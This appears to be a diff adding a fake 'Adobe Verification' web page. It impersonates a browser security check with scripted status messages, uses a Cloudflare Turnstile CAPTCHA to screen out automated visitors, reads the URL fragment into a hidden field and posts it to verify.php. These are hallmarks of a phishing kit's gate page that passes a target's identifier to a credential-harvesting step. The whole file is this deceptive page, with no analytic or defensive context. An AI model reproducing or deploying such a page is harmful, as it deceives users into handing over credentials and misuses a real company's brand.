@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Adobe Verification</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background-color: #1d1d1d;
+      color: white;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    body {
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    h1 {
+      font-weight: 600;
+      margin-bottom: 10px;
+      font-size: 24px;
+      white-space: nowrap; /* Force one line */
+    }
+    #security-msg {
+      font-size: 16px;
+      color: #ccc;
+      margin-bottom: 30px;
+      min-height: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Checking your browser before accessing Adobe...</h1>
+    <p id="security-msg">Verifying you are human. This may take a few seconds...</p>
+
+    <form id="turnstile-form" action="verify.php" method="POST">
+      <input type="hidden" name="hash" id="hash-field" />
+      <!-- Cloudflare Turnstile CAPTCHA widget -->
+      <div
+        class="cf-turnstile"
+        data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
+        data-callback="onCaptchaSuccess"
+      ></div>
+    </form>
+  </div>
+
+  <!-- Load Turnstile CAPTCHA script -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <script>
+    // Animate status messages
+    const statusMessages = [
+      "Performing browser integrity check...",
+      "Validating session security...",
+      "Verifying you are human..."
+    ];
+    const securityMsg = document.getElementById("security-msg");
+    statusMessages.forEach((msg, i) => {
+      setTimeout(() => {
+        securityMsg.textContent = msg;
+      }, i * 1300);
+    });
+
+    // Pass hash from URL to hidden input
+    window.addEventListener("DOMContentLoaded", () => {
+      const hash = window.location.hash;
+      if (hash) {
+        document.getElementById("hash-field").value = hash;
+      }
+    });
+
+    // Submit form when CAPTCHA succeeds
+    function onCaptchaSuccess() {
+      document.getElementById("turnstile-form").submit();
+    }
+  </script>
+</body>
+</html>
